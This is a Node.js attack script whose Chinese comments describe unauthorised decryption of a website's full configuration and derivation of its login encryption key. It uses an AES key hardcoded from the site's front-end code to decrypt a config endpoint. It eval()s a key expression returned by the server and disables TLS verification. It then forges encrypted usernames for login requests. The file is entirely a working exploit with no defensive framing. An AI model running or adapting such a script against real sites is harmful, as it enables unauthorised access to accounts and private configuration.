#!/usr/bin/env node
// 未授权解密站点全量配置 + 派生登录加密 key
'use strict';
const crypto = require('crypto');
const https = require('https');

const CFG_KEY = 'a6bqLk97V45jXVmj'; // m+o+q，来自 app.js 模块级常量

function aesDec(ctB64, keyStr) {
  let kb = Buffer.from(keyStr, 'utf8').slice(0, 32);
  if (keyStr.length < 4) kb = Buffer.from(keyStr + 'kvsL', 'utf8');
  if (![16, 24, 32].includes(kb.length)) kb = kb.slice(0, 16);
  const d = crypto.createDecipheriv('aes-' + kb.length * 8 + '-ecb', kb, null);
  d.setAutoPadding(false);
  let out = Buffer.concat([d.update(Buffer.from(ctB64, 'base64')), d.final()]);
  const pad = out[out.length - 1];
  if (pad > 0 && pad <= 16) out = out.slice(0, out.length - pad);
  return out.toString('utf8');
}
function aesEnc(pt, keyStr) {
  let kb = Buffer.from(keyStr, 'utf8').slice(0, 32);
  if (![16, 24, 32].includes(kb.length)) kb = kb.slice(0, 16);
  const c = crypto.createCipheriv('aes-' + kb.length * 8 + '-ecb', kb, null);
  c.setAutoPadding(false);
  let b = Buffer.from(String(pt), 'utf8');
  const p = 16 - (b.length % 16);
  b = Buffer.concat([b, Buffer.alloc(p, p)]);
  return Buffer.concat([c.update(b), c.final()]).toString('base64');
}

const HOST = 'example.com';
const H = { 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
            Accept: 'application/json, text/plain, */*',
            Referer: `https://${HOST}/wap/`, 'X-Requested-With': 'XMLHttpRequest' };

function get(path) {
  return new Promise((res, rej) => {
    https.get({ host: HOST, path, headers: H, rejectUnauthorized: false }, s => {
      let d = ''; s.on('data', c => d += c); s.on('end', () => res(d));
    }).on('error', rej);
  });
}

(async () => {
  const raw = (await get('/aocai-api/getWebConfigNew')).trim().replace(/^"|"$/g, '');
  const cfg = JSON.parse(aesDec(raw, CFG_KEY));
  console.log(JSON.stringify(cfg.data, null, 1));
  const keyf = cfg.data.key;
  const loginKey = String(eval(keyf)) + String(keyf).substring(0, 16);
  console.log('login key =', loginKey);
  console.log('username 密文 =', aesEnc(process.argv[2] || 'test', loginKey));
})();